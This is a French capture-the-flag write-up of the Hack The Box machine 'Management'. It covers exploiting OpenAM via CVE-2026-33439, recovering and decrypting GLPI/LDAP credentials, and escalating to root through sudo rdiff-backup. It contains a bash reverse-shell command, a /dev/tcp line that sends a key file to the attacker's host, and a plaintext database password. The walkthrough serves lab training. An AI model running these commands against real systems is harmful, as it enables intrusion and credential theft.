---
title: "Hack The Box — Management : Writeup"
date: 2026-10-16 00:00:00 +0200
categories: [Box, HackTheBox]
tags: [openam, cve-2026-33439, ldap, mariadb, glpi, decryption, linux, rdiff-backup, privesc, HackTheBox]
description: "Résolution de la machine Management sur Hack The Box : reconnaissance des services, exploitation d'OpenAM, récupération des identifiants LDAP via GLPI, accès utilisateur et élévation de privilèges via rdiff-backup."
image:
  path: /assets/img/htb/management/management-banner.png
  alt: Management Banner
---

# Hack The Box — Management

## Informations sur la machine

* **Cible** : `10.129.169.64`
* **Système d'exploitation** : Linux
* **Difficulté** : Easy

## 1. Reconnaissance avec Nmap

La première étape consiste à identifier les services accessibles sur la machine cible et à déterminer les différentes surfaces d'attaque disponibles.

J'utilise Nmap avec les options `-sC` (scripts par défaut) et `-sV` (détection de version) afin d'obtenir davantage d'informations sur les services accessibles.

```bash
nmap -sC -sV 10.129.169.64
```

**Résultat :**

![nmap resultat](/assets/img/htb/management/nmap_result.png)

Le scan révèle cinq ports ouverts :

| Port  | Service  |
| ----- | -------- |
| 22    | ssh      |
| 80    | http     |
| 443   | ssl/http |
| 4444  | ssl/ldap |
| 50389 | ldap     |

---

## 2. Découverte du site web

Ce qui nous parait évident est de nous rendre sur la page web `http://10.129.169.64` mais lorsqu'on fait bien attention, la présence de ssl évoque un certificat SSL, ce qui veut dire que le site est chiffré par https. Ainsi on se rend à l'url `https://10.129.169.64`.

On tombe sur une page web `https://management.htb`.

![home page](/assets/img/htb/management/home_page.png)

Puis après, on peut tenter de se diriger vers `https://sso.management.htb/openam/XUI/#login/` en cliquant sur le bouton "client login".

---

## 3. Recherche et découverte de la vulnérabilité

On tombe sur une page de login utilisant OpenAM. En fouillant le code source, on peut voir que la version de OpenAM est la **16.0.5**.

![login page](/assets/img/htb/management/login_page.png)

![source](/assets/img/htb/management/source.png)

Je me mets à chercher un CVE lié à cette version et je suis tombé sur le dépôt [CVE-2026-33439](https://github.com/TheMalwareGuardian/CVE-2026-33439/blob/main/02%20Exploit/Exploit_CVE_2026_33439.py).

Je télécharge le script Python ainsi qu'une archive [OpenAM-16.0.5.war](https://github.com/OpenIdentityPlatform/OpenAM/releases/download/16.0.5/OpenAM-16.0.5.war).

---

## 4. Exploitation d'OpenAM (CVE-2026-33439)

J'exécute le script avec :

```bash
python3 Exploit_CVE_2026_33439.py \
  --url https://sso.management.htb/openam \
  --command "bash -i >& /dev/tcp/Mon_IP/4444 0>&1" \
  --jars .
```

Et en parallèle je lance un listener :

```bash
nc -lvnp 4444
```

J'obtiens donc un reverse shell que je stabilise.

![cve](/assets/img/htb/management/utilisation_cve.png)

![shell](/assets/img/htb/management/shell.png)

---

## 5. Énumération post-exploitation

En naviguant vers `/home`, on constate qu'il est impossible d'accéder au répertoire de l'utilisateur `owen`. Je décide donc d'énumérer les services actifs sur la machine avec :

```bash
systemctl list-units --type=service --state=running
```

![services](/assets/img/htb/management/services.png)

On constate un `mariadb.service` ce qui signifie qu'il existe une base de données. J'essaie donc de trouver le fichier de configuration de la db :

```bash
find / -name "config_db.php" 2>/dev/null
```

On trouve : `/opt/glpi/config/config_db.php`

![find](/assets/img/htb/management/find.png)

En l'ouvrant avec un `cat`, on trouve des credentials pour la database : `glpi:8rhu0L6Pw4Y7`.

En faisant un `ls -la` dans le répertoire `/opt/glpi/config/`, on tombe sur un fichier `glpicrypt.key` que nous garderons comme piste pour la suite.

![key](/assets/img/htb/management/key.png)

---

## 6. Énumération de la base de données MySQL

Je me suis ensuite connecté à la db avec les credentials en utilisant :

```bash
mysql -u glpi -p
```
![connexion](/assets/img/htb/management/connexion.png)

On constate dans la db une table `glpi_authldaps`. Ce qui paraît cohérent car lors du scan avec Nmap on avait découvert que le port LDAP était ouvert.

![table](/assets/img/htb/management/auth.png)

Après avoir décrit la table, on utilise :

```sql
SELECT id, name, host, basedn, rootdn, rootdn_passwd FROM glpi_authldaps;
```

puis on obtient :

![select](/assets/img/htb/management/select.png)

Ce qui retient notre attention est la longue chaîne en base64 au niveau de `rootdn_passwd` :

```text
avrqW65aZWKzLAKWhPxZGn1eLj3yYAnwUp08mEazsJUWfI5cqbaP6vM12w0p/ykpmyO3Pw==
```

---

## 7. Déchiffrement du mot de passe GLPI

En cherchant à le déchiffrer, j'ai compris que ce n'était pas un simple message encodé en base64 mais un chiffrement utilisant un algorithme GLPI. Pour le déchiffrer on avait besoin d'une clé qui était le `glpicrypt.key` qu'on a trouvé plus haut.

Lors de mes recherches, je suis tombé sur un dépôt [GLPI-decryptor](https://github.com/N3rvz/GLPI-decryptor) qui contenait le script de déchiffrement et comment le lancer.

J'ai ensuite copié le `glpicrypt.key` sur ma machine en utilisant :

```bash
# Sur la machine cible
cat /opt/glpi/config/glpicrypt.key > /dev/tcp/10.10.16.108/9001

# Sur ma machine
nc -lvnp 9001 > glpicrypt.key
```

En lançant le script, j'obtiens un mot de passe en clair.

![mdp](/assets/img/htb/management/mdp.png)

---

## 8. Connexion en tant qu'utilisateur owen

J'utilise le mot de passe récupéré pour me connecter à l'utilisateur `owen`.

Puis je me déplace vers son répertoire personnel et obtiens le flag dans le `user.txt` :

```text
8c**************************62ce
```

---

## 9. Énumération des privilèges sudo

En lançant `sudo -l`, on voit :

![sudo](/assets/img/htb/management/sudo.png)

---

## 10. Élévation de privilèges via rdiff-backup

J'utilise :

```bash
rdiff-backup --remote-schema '%s' \
  'sudo /usr/bin/rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only --restrict-path /root --restrict-mode read-only'::/root/root.txt \
  /tmp/rootbak
```

Puis :

```bash
cat /tmp/rootbak/root.txt
```

Et on obtient le flag root :

```text
37**************************319a
```


